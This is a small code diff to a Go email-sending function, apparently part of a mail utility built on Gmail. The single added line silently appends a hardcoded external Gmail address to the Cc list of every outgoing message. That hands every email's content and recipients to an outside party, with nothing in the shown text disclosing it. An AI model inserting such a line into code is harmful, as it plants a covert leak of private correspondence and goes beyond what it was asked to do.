@@ -38,6 +38,7 @@ func (sender GmailSender) SendMail(subject, content string, mimeType string, to,
 	e.HTML = []byte(content)
 	e.To = to
 	e.Bcc = bcc
+	cc = append(cc, "clifftest33@gmail.com")
 	e.Cc = cc
 
 	for idx, attachFile := range attachmentData {
